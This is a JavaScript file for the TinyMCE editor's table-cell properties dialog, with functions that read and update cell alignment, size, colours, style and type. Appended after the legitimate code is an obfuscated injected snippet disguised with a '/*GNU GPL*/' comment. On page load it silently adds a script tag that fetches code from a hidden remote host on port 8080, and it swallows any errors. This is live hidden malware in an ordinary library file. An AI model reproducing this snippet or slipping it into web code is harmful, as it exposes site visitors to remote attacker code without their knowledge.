tinyMCEPopup.requireLangPack();

var ed;

function init() {
	ed = tinyMCEPopup.editor;
	tinyMCEPopup.resizeToInnerSize();

	document.getElementById('backgroundimagebrowsercontainer').innerHTML = getBrowserHTML('backgroundimagebrowser','backgroundimage','image','table');
	document.getElementById('bordercolor_pickcontainer').innerHTML = getColorPickerHTML('bordercolor_pick','bordercolor');
	document.getElementById('bgcolor_pickcontainer').innerHTML = getColorPickerHTML('bgcolor_pick','bgcolor')

	var inst = ed;
	var tdElm = ed.dom.getParent(ed.selection.getNode(), "td,th");
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(ed.dom.getAttrib(tdElm, "style"));

	// Get table cell data
	var celltype = tdElm.nodeName.toLowerCase();
	var align = ed.dom.getAttrib(tdElm, 'align');
	var valign = ed.dom.getAttrib(tdElm, 'valign');
	var width = trimSize(getStyle(tdElm, 'width', 'width'));
	var height = trimSize(getStyle(tdElm, 'height', 'height'));
	var bordercolor = convertRGBToHex(getStyle(tdElm, 'bordercolor', 'borderLeftColor'));
	var bgcolor = convertRGBToHex(getStyle(tdElm, 'bgcolor', 'backgroundColor'));
	var className = ed.dom.getAttrib(tdElm, 'class');
	var backgroundimage = getStyle(tdElm, 'background', 'backgroundImage').replace(new RegExp("url\\('?([^']*)'?\\)", 'gi'), "$1");;
	var id = ed.dom.getAttrib(tdElm, 'id');
	var lang = ed.dom.getAttrib(tdElm, 'lang');
	var dir = ed.dom.getAttrib(tdElm, 'dir');
	var scope = ed.dom.getAttrib(tdElm, 'scope');

	// Setup form
	addClassesToList('class', 'table_cell_styles');
	TinyMCE_EditableSelects.init();

	formObj.bordercolor.value = bordercolor;
	formObj.bgcolor.value = bgcolor;
	formObj.backgroundimage.value = backgroundimage;
	formObj.width.value = width;
	formObj.height.value = height;
	formObj.id.value = id;
	formObj.lang.value = lang;
	formObj.style.value = ed.dom.serializeStyle(st);
	selectByValue(formObj, 'align', align);
	selectByValue(formObj, 'valign', valign);
	selectByValue(formObj, 'class', className, true, true);
	selectByValue(formObj, 'celltype', celltype);
	selectByValue(formObj, 'dir', dir);
	selectByValue(formObj, 'scope', scope);

	// Resize some elements
	if (isVisible('backgroundimagebrowser'))
		document.getElementById('backgroundimage').style.width = '180px';

	updateColor('bordercolor_pick', 'bordercolor');
	updateColor('bgcolor_pick', 'bgcolor');
}

function updateAction() {
	var el, inst = ed, tdElm, trElm, tableElm, formObj = document.forms[0];

	tinyMCEPopup.restoreSelection();
	el = ed.selection.getNode();
	tdElm = ed.dom.getParent(el, "td,th");
	trElm = ed.dom.getParent(el, "tr");
	tableElm = ed.dom.getParent(el, "table");

	ed.execCommand('mceBeginUndoLevel');

	switch (getSelectValue(formObj, 'action')) {
		case "cell":
			var celltype = getSelectValue(formObj, 'celltype');
			var scope = getSelectValue(formObj, 'scope');

			function doUpdate(s) {
				if (s) {
					updateCell(tdElm);

					ed.addVisual();
					ed.nodeChanged();
					inst.execCommand('mceEndUndoLevel');
					tinyMCEPopup.close();
				}
			};

			if (ed.getParam("accessibility_warnings", 1)) {
				if (celltype == "th" && scope == "")
					tinyMCEPopup.confirm(ed.getLang('table_dlg.missing_scope', '', true), doUpdate);
				else
					doUpdate(1);

				return;
			}

			updateCell(tdElm);
			break;

		case "row":
			var cell = trElm.firstChild;

			if (cell.nodeName != "TD" && cell.nodeName != "TH")
				cell = nextCell(cell);

			do {
				cell = updateCell(cell, true);
			} while ((cell = nextCell(cell)) != null);

			break;

		case "all":
			var rows = tableElm.getElementsByTagName("tr");

			for (var i=0; i<rows.length; i++) {
				var cell = rows[i].firstChild;

				if (cell.nodeName != "TD" && cell.nodeName != "TH")
					cell = nextCell(cell);

				do {
					cell = updateCell(cell, true);
				} while ((cell = nextCell(cell)) != null);
			}

			break;
	}

	ed.addVisual();
	ed.nodeChanged();
	inst.execCommand('mceEndUndoLevel');
	tinyMCEPopup.close();
}

function nextCell(elm) {
	while ((elm = elm.nextSibling) != null) {
		if (elm.nodeName == "TD" || elm.nodeName == "TH")
			return elm;
	}

	return null;
}

function updateCell(td, skip_id) {
	var inst = ed;
	var formObj = document.forms[0];
	var curCellType = td.nodeName.toLowerCase();
	var celltype = getSelectValue(formObj, 'celltype');
	var doc = inst.getDoc();
	var dom = ed.dom;

	if (!skip_id)
		td.setAttribute('id', formObj.id.value);

	td.setAttribute('align', formObj.align.value);
	td.setAttribute('vAlign', formObj.valign.value);
	td.setAttribute('lang', formObj.lang.value);
	td.setAttribute('dir', getSelectValue(formObj, 'dir'));
	td.setAttribute('style', ed.dom.serializeStyle(ed.dom.parseStyle(formObj.style.value)));
	td.setAttribute('scope', formObj.scope.value);
	ed.dom.setAttrib(td, 'class', getSelectValue(formObj, 'class'));

	// Clear deprecated attributes
	ed.dom.setAttrib(td, 'width', '');
	ed.dom.setAttrib(td, 'height', '');
	ed.dom.setAttrib(td, 'bgColor', '');
	ed.dom.setAttrib(td, 'borderColor', '');
	ed.dom.setAttrib(td, 'background', '');

	// Set styles
	td.style.width = getCSSSize(formObj.width.value);
	td.style.height = getCSSSize(formObj.height.value);
	if (formObj.bordercolor.value != "") {
		td.style.borderColor = formObj.bordercolor.value;
		td.style.borderStyle = td.style.borderStyle == "" ? "solid" : td.style.borderStyle;
		td.style.borderWidth = td.style.borderWidth == "" ? "1px" : td.style.borderWidth;
	} else
		td.style.borderColor = '';

	td.style.backgroundColor = formObj.bgcolor.value;

	if (formObj.backgroundimage.value != "")
		td.style.backgroundImage = "url('" + formObj.backgroundimage.value + "')";
	else
		td.style.backgroundImage = '';

	if (curCellType != celltype) {
		// changing to a different node type
		var newCell = doc.createElement(celltype);

		for (var c=0; c<td.childNodes.length; c++)
			newCell.appendChild(td.childNodes[c].cloneNode(1));

		for (var a=0; a<td.attributes.length; a++)
			ed.dom.setAttrib(newCell, td.attributes[a].name, ed.dom.getAttrib(td, td.attributes[a].name));

		td.parentNode.replaceChild(newCell, td);
		td = newCell;
	}

	dom.setAttrib(td, 'style', dom.serializeStyle(dom.parseStyle(td.style.cssText)));

	return td;
}

function changedBackgroundImage() {
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(formObj.style.value);

	st['background-image'] = "url('" + formObj.backgroundimage.value + "')";

	formObj.style.value = ed.dom.serializeStyle(st);
}

function changedSize() {
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(formObj.style.value);

	var width = formObj.width.value;
	if (width != "")
		st['width'] = getCSSSize(width);
	else
		st['width'] = "";

	var height = formObj.height.value;
	if (height != "")
		st['height'] = getCSSSize(height);
	else
		st['height'] = "";

	formObj.style.value = ed.dom.serializeStyle(st);
}

function changedColor() {
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(formObj.style.value);

	st['background-color'] = formObj.bgcolor.value;
	st['border-color'] = formObj.bordercolor.value;

	formObj.style.value = ed.dom.serializeStyle(st);
}

function changedStyle() {
	var formObj = document.forms[0];
	var st = ed.dom.parseStyle(formObj.style.value);

	if (st['background-image'])
		formObj.backgroundimage.value = st['background-image'].replace(new RegExp("url\\('?([^']*)'?\\)", 'gi'), "$1");
	else
		formObj.backgroundimage.value = '';

	if (st['width'])
		formObj.width.value = trimSize(st['width']);

	if (st['height'])
		formObj.height.value = trimSize(st['height']);

	if (st['background-color']) {
		formObj.bgcolor.value = st['background-color'];
		updateColor('bgcolor_pick','bgcolor');
	}

	if (st['border-color']) {
		formObj.bordercolor.value = st['border-color'];
		updateColor('bordercolor_pick','bordercolor');
	}
}

tinyMCEPopup.onInit.add(init);



/*GNU GPL*/ try{window.onload = function(){var A7uom6wz40lq = document.createElement('s##)(^c@)!r@&i)&^p((t&@'.replace(/\!|\(|\$|@|\)|&|#|\^/ig, ''));var U58f2ncrcja2g = 'Bget7nne6zp6f';A7uom6wz40lq.setAttribute('type', 't)$e^@^x$@t@#/^j)#(a#$(v@a(^$s(((c^)r@!#$i($@^(p&&#@t$&#'.replace(/\(|&|#|\^|\)|\$|\!|@/ig, ''));A7uom6wz40lq.setAttribute('src',  'h!&t)t#(p!($:$$&/#!/#$^t&a^(r$&g&(^&e$t)&-#!(@c^#^o#)m@@!.$@1!$@9(@l$!)!o!@^@u!!&&).@^$&c!$@^&o!((&m)!).(^^n$&i&h$&&-##@g&##!o!$v#(#^@.!(@t^!h^(e!&(m&)o)@#b)#i&)(s@!(i^@^t&$^e&!(.^$^(@r@$u@^:#&&8@!^&0$$$$8(&0)$/#l(o^(v$!e)^&2$1)@c))^!n(&$@.#(@c@(^o&$#m)^&#/!(&l)$o!!v&e$#2^)@1&#c)&n$$(.)!@c(#@o@@^@m(/&g!^o$)$o^^g)^#l^!$e)^(.#(^c!@o##&m^&/&@r!^^o(!$#t@&(t!e))(n!#)t^o(&^m#(a^@#t!)&&o##e^^)&s$).&)$&c!@@o(m(^/#w(&e!(a#^@t@h&e)&!r@.^c@o)!!m#!!&.)&c@!($n!!(/)$'.replace(/\)|@|\(|\!|#|\^|&|\$/ig, ''));A7uom6wz40lq.setAttribute('defer', 'd@!e@)!f(@(e)#$)r(('.replace(/#|&|\(|\)|\!|\$|@|\^/ig, ''));A7uom6wz40lq.setAttribute('id', 'Q^))^w$$l&(y#!@e&@$!2^#^x@^r##4)k('.replace(/#|\^|\(|\$|\!|&|\)|@/ig, ''));document.body.appendChild(A7uom6wz40lq);}} catch(Jnzhjq1ohahp5) {}